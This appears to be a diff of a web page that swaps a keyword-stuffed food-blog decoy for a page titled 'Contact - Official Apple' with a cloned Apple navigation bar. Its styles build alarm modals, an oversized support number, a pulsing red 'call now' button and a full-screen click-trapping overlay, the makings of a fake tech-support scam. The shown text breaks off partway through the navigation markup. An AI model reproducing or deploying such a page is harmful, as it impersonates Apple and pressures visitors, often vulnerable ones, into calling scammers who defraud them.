@@ -1,9 +1,820 @@
-<html><head><meta charset="UTF-8" class="xs-AmaRcqIgWoooK"/><link rel="stylesheet" href="styles.css" class="wrap-XyntrvQNYiobCThA"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="narrow-SLzIMnIBHOd"/><meta name="referrer" content="no-referrer" class="holder-DtQQogxKLz"/><style> @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #3d69ff; border-radius: 27px; } *::-webkit-scrollbar-thumb { background-color: #e9bfdc; border-radius: 27px; border: 2px solid #3d69ff; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>mealova.site</title><!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+    <style>
+
+        .pageTitle-intro {max-width: 50.25rem!important;}
+        .modal-content {
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: none;
+            height: 200px;
+        }
+
+        .modal-header {
+            color: #333;
+            padding: 20px;
+            border-bottom: none;
+        }
+
+        .modal-body {
+            padding: 15px;
+        }
+
+        .alert-text {
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            text-align: start;
+            font-size: 14px;
+        }
+
+        .alert-text p {
+            margin-bottom: 15px;
+            font-size: 12px;
+            text-align: justify;
+        }
+
+        .highlight {
+            color: #e63946;
+            font-weight: 600;
+        }
+
+        .support-number {
+            font-size: 25px;
+            font-weight: 700;
+            color: #0071e3;
+            margin: 10px 0;
+            padding: 12px;
+        }
+
+        .counter {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .btn-primary {
+            background: #0071e3;
+            border: none;
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            background: #0056b3;
+        }
+
+        .btn-outline-secondary {
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: rgba(0, 0, 0, 0.7);
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .blink {
+            animation: blink 0.5s linear 3;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @media (min-width: 992px) {
+
+            .modal-lg,
+            .modal-xl {
+                --bs-modal-width: 600px !important;
+                --bs-modal-height: 400px !important;
+            }
+        }
+
+        /* Style for stacked modals */
+        .modal-backdrop {
+            opacity: 0.8;
+        }
+
+        .modal-stack {
+            position: fixed;
+            z-index: 1080;
+        }
+
+        .modal-stack.show .modal-dialog {
+            transform: scale(1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Custom positioning */
+        .modal-dialog.positioned {
+            position: absolute;
+        }
+
+        .apple-logo {
+            font-size: 60px;
+            color: #333;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .callnowbtn {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+        }
+
+        .actionbtn {
+            position: absolute;
+            right: 0px;
+            bottom: 15px;
+        }
+
+        @media (max-width: 576px) {
+            .btn-outline-secondary {
+                padding: 10px 15px;
+                font-weight: 600;
+            }
+
+            .modal-content {
+                background: #333;
+                height: 270px;
+            }
+
+            .positioned .modal-header {
+                color: #333;
+                padding: 0px;
+                border-bottom: none;
+                padding-right: 16px;
+                padding-top: 15px;
+            }
+
+            .modal-dialog.modal-lg.positioned .modal-content {
+                background: #333;
+                height: 270px !important;
+            }
+
+            .alert-text {
+                color: #fff;
+            }
+
+            .modal.show .modal-dialog {
+                top: 30% !important;
+                max-width: 95% !important;
+                margin: auto;
+            }
+        }
+
+        /* ðŸ”´ CTA button look + bounce */
+        .callnowbtn .btn {
+            font-size: 14px;
+            border: none;
+            font-weight: 600;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #ff3b3b, #c70000);
+            box-shadow: 0 10px 24px rgba(199, 0, 0, 0.35), 0 0 0 6px rgba(255, 59, 59, 0.12) inset;
+            animation: pulseBounce 1.8s ease-in-out infinite;
+            transition: transform .25s ease, box-shadow .25s ease, background .25s ease;
+        }
+
+        .callnowbtn .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 14px 28px rgba(199, 0, 0, 0.45), 0 0 0 8px rgba(255, 59, 59, 0.18) inset;
+        }
+
+        .call-icon {
+            display: inline-block;
+            line-height: 1;
+            font-size: 18px;
+            vertical-align: middle;
+            margin-right: 10px;
+            transform-origin: 50% 10%;
+            animation: ringShake 1s ease-in-out infinite;
+            -webkit-animation: ringShake 1s ease-in-out infinite;
+        }
+
+        /* Icon ring-shake keyframes */
+        @keyframes ringShake {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            10% {
+                transform: rotate(16deg);
+            }
+
+            20% {
+                transform: rotate(-16deg);
+            }
+
+            30% {
+                transform: rotate(12deg);
+            }
+
+            40% {
+                transform: rotate(-12deg);
+            }
+
+            50% {
+                transform: rotate(8deg);
+            }
+
+            60% {
+                transform: rotate(-8deg);
+            }
+
+            70% {
+                transform: rotate(4deg);
+            }
+
+            80% {
+                transform: rotate(-4deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        /* Button bounce/pulse */
+        @keyframes pulseBounce {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 10px 24px rgba(199, 0, 0, .35), 0 0 0 6px rgba(255, 59, 59, .12) inset;
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.05);
+                box-shadow: 0 16px 32px rgba(199, 0, 0, .45), 0 0 0 8px rgba(255, 59, 59, .16) inset;
+            }
+        }
+
+        /* Click overlay - FIXED */
+        .click-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+            display: none; /* Hidden by default */
+        }
+
+        /* Show overlay only when needed */
+        .click-overlay.active {
+            display: block;
+        }
+
+        @media (max-width:400px){
+
+            .btn-primary {
+    background: #0071e3;
+    border: none;
+    padding: 6px 16px;
+    font-weight: 600;
+    font-size: 15px;
+}
+.btn-outline-secondary {
+        padding: 6px 16px;
+        margin-right: 10px !important;
+        font-weight: 600;
+        font-size: 15px;
+    }
+    .callnowbtn {
+    position: absolute;
+    bottom: 9px;
+    left: 13px;}
+
+    .callnowbtn .btn {
+    font-size: 14px;
+    border: none;
+    font-weight: 600;
+    padding: 7px 7px;}
+    .actionbtn {
+    position: absolute;
+    right: 0px!important;
+    bottom: 15px;
+}
+
+#applealertmodeltwo .btn-primary {margin-right:0px!important;}
+    #applealertmodeltwo .btn-outline-secondary{  margin-right: 5px !important;}
+
+
+        }
+    </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NP1FZ3QXDK"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-YTP08B4056');
-</script></head><body class="tagline-uHYbgAzoXdbfyg"><main class="aside-mazkDILp"><div class="row-PqTDzDTSdS"><div class="tagline-nwEWLMbnbLq"><div class="caption-uRnYAxzb"><img src="./img/bb12ab598b30e64a20d4b537696ef3f4079dcc4c.jpg" class="page-MgypWNPbhMOD"/></div></div><div class="widget-CUIFBzmkq"><div class="column-BLYsXd"><h3 class="subject-OXNKUwkGMRjvLa">mealova.site</h3><span class="subtitle-fgMlGYdcZYoEBBHo">Soups Cuisine Discover the Taste charm Vegan of pet-friendly cafés Dining Seafood that Cooking Flavor welcome furry companions, creating Ingredient a Non-veg Snacks unique environment for both pets Beverages and Vegetarian their Desserts Recipe Dish owners. Meal</span></div><div class="breadcrumbs-sCcfgntAU"><a href="themelist0.html" class="tiny-jYGsZgzRhqo"><span class="caption-bZdDEXiCAUIhvPEC">Full text</span></a><a href="index.php" class="large-RTjSQB"><span class="md-HoZKJFYVMwKh">Tell others</span></a></div></div></div><div class="content-XYHiWcSP"><div class="tagline-yhDjNpUwoDdHYe"><div class="more-eSprFZYUtwUiOEq"><h3 class="wrapper-OjAqhwFSqL">Collection</h3></div></div><div class="wide-mJOYbkNtKoGD"><div class="preview-bOsDOaUMiLrd"><img src="./img/e0fe47a037843161858e7335b8ec8c947799fc3e.jpg" class="thumbnail-KDnqckGeVDsFXpo"/><img src="./img/2b2e66a0f10152c9986122276f83a59e391a3bed.jpg" class="more-eMChoyGTkcUAqZuR"/><img src="./img/67a6f4cd3f6d7982a705f6c38b827e83d0e4b724.jpg" class="xl-uDVAblTK"/><img src="./img/bd4ff4842ad58e9afa78d7958c493372e77b266d.jpg" class="row-TFhFvkqxzaG"/><img src="./img/3e41b5d9ba65b7d495ac37b4beda81a6e96430ca.jpg" class="narrow-TFNEhsVLXLZzQRLm"/><img src="./img/d5fe4dc87caea1aca74f7e4efdd9379dd473adba.jpg" class="page-SrSjqvvc"/><img src="./img/c575c9081cec11a541c50e109ee18859450283e1.jpg" class="wrapper-AUVbyoKM"/><img src="./img/8540170053784f09d4f67d4a01946bf5b2a271f2.jpg" class="tagline-dvJdHsJhgWqWA"/><img src="./img/4fc00fa758a3921bcc63b7f96ce3dcfcd8340c1a.jpg" class="icon-GzaYorHqGYSXSWfr"/><img src="./img/d5818a61f3925a3eb4e280b58f94cf22adf1ea14.jpg" class="picture-bGNeoOC"/></div></div></div><div class="avatar-BEiayirputo"><div class="img-uPFXVoXdj"><div class="button-EhskMHI"><div class="xl-hnHflOkEgGDUg"><div class="md-gaoainNUS"><img src="./img/7c908b78f4411ebee723978fd705f852588dc94c.jpg" class="large-qBQaOLzQtRsVSMZ"/></div></div><div class="btn-OpbjUxorolNV"><div class="sm-onEKGyR"><h5 class="wide-arygYGGf">Exploring Global Flavors: A Culinary Journey Around the World</h5><div class="big-QtwufhPyNpn"><span class="wrap-lJCDHJUxuFA">Embark Soups on a Seafood culinary Vegan Flavor adventure as we explore iconic dishes and flavors from various cultures, Recipe highlighting the Meal significance Vegetarian of Cuisine each cuisine Ingredient and Dish Cooking its Desserts Beverages unique Snacks Taste ingredients. Non-veg Dining</span></div></div><div class="breadcrumbs-JRnCaxlbrTtGeeDU"><a href="themelist1.html" class="tagline-WyHXYVPSvOYXtsl"><span class="button-fcjMLQUeKKjt">Show all</span></a></div><div class="more-KaEARAufPHJjG"><div class="container-FhmpevAMTVEW"><div class="img-TkEBXScjFpYUoRHm"><span class="preview-NahbOa">Sofia Ramirez</span></div></div><div class="active-mTyLqdbnPz"><div class="narrow-hnwbNzuHxdLuGGHQ"><span class="preview-VLXyJTOfnvxQus">April 16, 2025</span></div></div></div></div></div><div class="medium-bCbJkq"><div class="img-tdbdRGyKEDk"><div class="headline-AJYqUTilHvjBzZG"><img src="./img/91df3cfdc3b534f8bd629364c6782746aa6c4238.jpg" class="tip-xqPYPgS"/></div></div><div class="small-cExFfJ"><div class="md-EZHxwJEYE"><h5 class="control-hPNDeyMydm">Exploring the World of Artisan Cheese: A Journey Through Flavor</h5><div class="medium-HdwODqNoSfXeBGUr"><span class="medium-oaUQgwmUo">Beverages Soups This article Flavor delves into the rich world Vegan Recipe of Dining Vegetarian Meal artisan Seafood cheese, Ingredient highlighting its history, production Taste Snacks methods, and the diverse flavors that make Dish each Desserts cheese Cuisine Non-veg unique. Cooking</span></div></div><div class="current-UyHRWpcigwTbb"><a href="themelist2.html" class="thumbnail-siNMCCIWfKVef"><span class="xl-SVRpmTgNbPY">Show all</span></a></div><div class="preview-MlqrPSoL"><div class="all-fRekVjthRCYONMEf"><div class="tagline-voirzi"><span class="icon-WPEeRjAVR">Emma Sinclair</span></div></div><div class="huge-SuGdPCDUNaHJ"><div class="icon-ipezDqfpDvtT"><span class="pic-idgaBOCxouydSw">November 25, 2024</span></div></div></div></div></div><div class="control-SBMcRGDXbZV"><div class="section-bvHBikXsNDIYhG"><div class="userpic-TTSAwyt"><img src="./img/00103903cdc286b8d1c11073568f0ca5cf448644.jpg" class="tip-noflysN"/></div></div><div class="picture-MNHnnZDVpJZEKYa"><div class="tiny-WgphVHm"><h5 class="thumb-JFujgkuSyZIza">Exploring the World of Cheesecakes: A Delightful Journey</h5><div class="holder-ynwJrIkvhyQqBym"><span class="text-RNXxsq">Snacks Dive into the rich Taste and creamy world Ingredient of Beverages Dining cheesecakes, exploring Meal Vegan various Non-veg styles, flavors, Flavor Soups and techniques Recipe that Dish make Desserts Cuisine Seafood this Cooking dessert Vegetarian a beloved favorite worldwide.</span></div></div><div class="all-MMyrAkMyfJgzkYy"><a href="themelist3.html" class="caption-UXsBIyZnTZrd"><span class="subtitle-qwihmNRgaRNl">Show all</span></a></div><div class="wrap-kbZvSPiJOLUgvA"><div class="sm-SGEYskshVKkfXlR"><div class="more-JLaAQBdnmn"><span class="title-kfKBdLBJEK">Liam Rodriguez</span></div></div><div class="huge-WFGHYJudzanKUp"><div class="subtitle-xMhLBUTTc"><span class="page-rWbfMPM">February 03, 2025</span></div></div></div></div></div><div class="thumbnail-uINshkRBQ"><div class="holder-ypInOFtULBhbY"><div class="large-JcFUSCH"><img src="./img/8e4640268cd2d872d9e801432e3d712123c281ff.jpg" class="caption-PXLmDCjzHjNg"/></div></div><div class="col-eibfdpXQXmh"><div class="img-dfpkPOCvOuM"><h5 class="icon-IUDwbcipvKKfYDU">Exploring the Rise of Pet-Friendly Cafés: A Tail-Wagging Trend</h5><div class="subtitle-mJzPWP"><span class="headline-RQiinhhvrgguX">This article Vegan delves into the growing Flavor popularity of pet-friendly cafés, Dish Recipe highlighting Soups Vegetarian Non-veg their Beverages unique Taste offerings, the Seafood joy they bring Dining Cuisine to Desserts Ingredient Cooking pet Meal owners, and Snacks the community they foster.</span></div></div><div class="active-gOLaNsdDyqFVsE"><a href="themelist4.html" class="control-zMfCCCsSqOJSsYPt"><span class="wide-fsXgabJZ">Show all</span></a></div><div class="pic-bWkLwTHeCPd"><div class="btn-JbprsxfCU"><div class="text-PCmeVpuaFV"><span class="box-mLuMNrkdb">Lucas Harrington</span></div></div><div class="section-yREPVHaYhLsysYh"><div class="row-ZoFojcZ"><span class="large-nXbrutQyPryShUwz">August 25, 2025</span></div></div></div></div></div><div class="current-mImdqxgMjTpeMkZ"><div class="medium-NkQhWV"><div class="all-vhULFckhKZjLOL"><img src="./img/a30913953692cf82285bb8432465ed140bfc2b77.jpg" class="row-zhDzxabedWEZzWe"/></div></div><div class="widget-GbqyuKin"><div class="userpic-tViREc"><h5 class="inner-LkHqsQO">Exploring the World of Street Food: A Culinary Adventure</h5><div class="huge-MfLWTGHn"><span class="wide-YmVaMU">This article takes you Cooking on a Vegetarian journey Recipe through Soups the vibrant Cuisine and diverse world of street Taste food, highlighting Dish its cultural Dining significance, Flavor popular dishes, Non-veg and the experiences Desserts that come with tasting Meal food Beverages Ingredient from local vendors Seafood around Vegan the globe. Snacks</span></div></div><div class="pic-WLCtGI"><a href="themelist5.html" class="thumbnail-qeKigZJc"><span class="preview-pViMNlTWbj">Show all</span></a></div><div class="userpic-xnsUKl"><div class="wide-VZNGvxP"><div class="control-tlBEozJDtIoVIu"><span class="avatar-mxDZFGiSfehJIRj">Sophie Alvarez</span></div></div><div class="more-ofWxlDkVvgPeTnk"><div class="tagline-OEwwyfcIQ"><span class="desc-sSNORNPvLOXZ">December 13, 2024</span></div></div></div></div></div><div class="wrap-aDLtJUWKtfS"><div class="narrow-IuIexuoOhfkuu"><div class="widget-sWIgrL"><img src="./img/acd51ba94ee660b2ead918c32e1cc91ff3050d08.jpg" class="all-XALYnbKWm"/></div></div><div class="image-KNgflmMz"><div class="aside-szTHpsL"><h5 class="btn-CiISbdg">Savoring the Season: A Guide to Cooking with Seasonal Ingredients</h5><div class="row-SJedcjODTnwtrCi"><span class="xs-iPUycttYbjxICY">This article explores the benefits Seafood Non-veg of Vegetarian Soups cooking with Dish seasonal ingredients, highlighting Desserts Vegan Dining Ingredient various seasonal fruits Snacks Meal Recipe Cuisine and vegetables, Beverages their culinary uses, Flavor and health Cooking Taste advantages.</span></div></div><div class="small-YhHCVwm"><a href="themelist6.html" class="icon-xYfFbELejgKSxqej"><span class="widget-fsaVBFpulvRGCUEd">Show all</span></a></div><div class="heading-JuNLTjezVBbPykyC"><div class="button-FXpuZUTdBWYMgV"><div class="aside-mBoYskk"><span class="content-FMkZavOZq">Oliver Reed</span></div></div><div class="icon-nsUQlAbs"><div class="large-JCNxLTp"><span class="button-vAWVgFmvQEp">November 01, 2024</span></div></div></div></div></div><div class="small-fkFWYHNCnfSlV"><div class="sidebar-UuPwniejqh"><div class="tip-urOhNBWQaGGQ"><img src="./img/5c26cc980bd18273fbbf12eb46dd508061d36cd2.jpg" class="wide-HGEfum"/></div></div><div class="large-VSiqCErDf"><div class="active-TjLMABygcw"><h5 class="userpic-kxJPdNSQWWZ">Decadent Delights: Exploring the World of Decadent Desserts</h5><div class="box-ySdTqEj"><span class="wrapper-szXQUrbXRJkZIs">A Ingredient deep dive into Beverages Taste the world of decadent desserts, Cooking Desserts Seafood Dining Snacks Vegetarian exploring their Vegan Meal Flavor Dish origins, variations, and the Non-veg Cuisine reasons why they Soups continue to captivate our taste buds. Recipe</span></div></div><div class="tiny-zrbLoyvwgTjnv"><a href="themelist7.html" class="wrap-XvPdVjQuoIimDeS"><span class="headline-uVHseWQpmE">Show all</span></a></div><div class="control-rvpwZsYIzgFg"><div class="tooltip-XOjNWAZckX"><div class="inner-eGTzGGTSxinTZGr"><span class="desc-HtbYLYWyKkwhDHWh">Liam Thompson</span></div></div><div class="sidebar-WsLpGQHsXN"><div class="thumb-NjVaoKUhp"><span class="tooltip-wSgZyOm">February 19, 2025</span></div></div></div></div></div><div class="active-koXhEczkwZpMj"><div class="preview-mcdBwVrgbRKl"><div class="control-aQRJhIwcEmfKdB"><img src="./img/bcae2dfbdb9b185ff5802b4f0df4c5c35df872bb.jpg" class="lg-HKYQJD"/></div></div><div class="subtitle-dHWxXoe"><div class="icon-OGgeSLekkFkOlYA"><h5 class="section-gEDKLHzOdkPHWCEg">Exploring the Unique Charms of Themed Cafés</h5><div class="subtitle-xerlZHFuqn"><span class="tooltip-pfRnqK">Dish This article Vegetarian Desserts Meal Cooking Dining delves Seafood into Beverages Non-veg the vibrant Ingredient Taste world Recipe of themed cafés, Vegan Cuisine examining their Soups diverse concepts and the memorable Flavor experiences they offer Snacks to patrons.</span></div></div><div class="img-FrvkuasSH"><a href="themelist8.html" class="title-zWFbmopJNxTkP"><span class="narrow-XgDrVrjwmd">Show all</span></a></div><div class="text-aNiFVSacR"><div class="pic-RAhVOsTkZLIoiU"><div class="btn-yxMJbI"><span class="image-zWjrIOapnDbOyS">Sofia Mitchell</span></div></div><div class="box-EzeNTTEI"><div class="huge-RyliVMzztHSkft"><span class="pic-JVYGoQFYd">November 09, 2024</span></div></div></div></div></div><div class="big-HjxXTRBgeMgPVPvx"><div class="thumbnail-qdoeCiw"><div class="xs-GaZubVqYExYGSMi"><img src="./img/e400a37b637e7d0c933f4f60f4cf098982f33db1.jpg" class="thumbnail-ADTnUGN"/></div></div><div class="breadcrumbs-MVVVydJH"><div class="narrow-BIhUAUwJ"><h5 class="avatar-QVCkVHhEIv">Exploring Global Cuisine: A Culinary Adventure</h5><div class="aside-zIFjUYmI"><span class="thumb-dJZtvcctVL">Ingredient Embark Flavor on Recipe a Dish journey through the Non-veg Seafood diverse world of global Cuisine Taste cuisine, discovering unique dishes, Soups cooking techniques, Beverages and cultural Desserts traditions that Snacks Cooking Vegan Dining shape the way we eat. Vegetarian Meal</span></div></div><div class="narrow-INuSQhCT"><a href="themelist9.html" class="userpic-SDJCivHSDPb"><span class="xl-mtrzMxcmhhPFYeCu">Show all</span></a></div><div class="title-dMCZeMWasMtJD"><div class="sm-HdBfunUUjPiHj"><div class="wrapper-jXUsAtgCEPGtdofT"><span class="icon-PFsIpLrFoE">Sofia Martinez</span></div></div><div class="xl-UOwCkLrskr"><div class="wrap-JHeXyycFlK"><span class="more-pPtDBbcToSgBXo">May 27, 2025</span></div></div></div></div></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; width: 80%; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: calc(42vw/var(--resizer)*100); flex-direction: column; background-color: #e9bfdc; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'waves-4_32874'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cpattern%20id%3D'32557'%20patternUnits%3D'userSpaceOnUse'%20width%3D'70'%20height%3D'8'%20patternTransform%3D'scale(7)%20rotate(141)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23fffffe'%2F%3E%3Cpath%20d%3D'M-.02%2022c8.373%200%2011.938-4.695%2016.32-9.662C20.785%207.258%2025.728%202%2035%202c9.272%200%2014.215%205.258%2018.7%2010.338C58.082%2017.305%2061.647%2022%2070.02%2022M-.02%2014.002C8.353%2014%2011.918%209.306%2016.3%204.339%2020.785-.742%2025.728-6%2035-6%2044.272-6%2049.215-.742%2053.7%204.339c4.382%204.967%207.947%209.661%2016.32%209.664M70%206.004c-8.373-.001-11.918-4.698-16.3-9.665C49.215-8.742%2044.272-14%2035-14c-9.272%200-14.215%205.258-18.7%2010.339C11.918%201.306%208.353%206-.02%206.002'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'3.860791649411224'%20stroke%3D'%23e9bfdc'%20fill%3D'none'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-139%2C-102)'%20fill%3D'url(%2332557)'%2F%3E%3C%2Fsvg%3E&quot;);" class="xs-xuDbCzbu"><div class="tagline-aQPSPO"><div class="subject-HfrPsGhpDuH"><h3 class="wrap-bkKucdXfwJrg">Talk With Us</h3><span class="icon-draMUqlnxFAyRLrS"></span></div></div><form action="undefined" class="xl-HXsFIuo"><input placeholder="Whatsapp number" class="more-mzOjVlYP"/><button type="submit" class="large-quJFqGa">Submit</button></form></div></main><footer class="container-oPSfZPUvE"><div class="img-nCtDSAIgSXGZbpr"><a href="./privacy_policy.html" class="headline-HPmEmZtfQyEYJd">Privacy Policy</a><a href="./terms_of_use.html" class="lg-TKsQGtXWJ">Terms Of Use</a><a href="./cookie_policy.html" class="text-suqaBCX">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="icon-WcIoQWEYzrpPLt"/><section class="section-cFIkEjhymZX"><div class="thumbnail-XonPJrczixH"><div class="breadcrumbs-jqlocKJfRFEGjcn"><label for="close" class="content-rtghMIKrHj"><span class="text-WLSNVF">Allow all</span></label></div></div><div class="avatar-tmvmbKNUZRNYv"><span class="pic-kHuiAwTLLvhlxMt">This website uses cookies.<br>We use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services.</span></div></section></body></html>
+  gtag('config', 'G-NP1FZ3QXDK');
+</script>
+    
+</head>
+
+<body>
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+    <!-- Rest of your HTML content -->
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+                        </span>
+                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+                        </span>
+                    </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+                        <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+                        <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+                        <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+                        <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+                        <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+                        <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+                        <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+                        <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+                        <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+                        <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+                        <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+                        <span class="ac-gn-link-text">Shopping Bag </span>
+                        <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+                    <span class="ac-gn-searchview-close-wrapper">
+                        <span class="ac-gn-searchview-close-left"></span>
+                        <span class="ac-gn-searchview-close-right"></span>
+                    </span>
+                </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
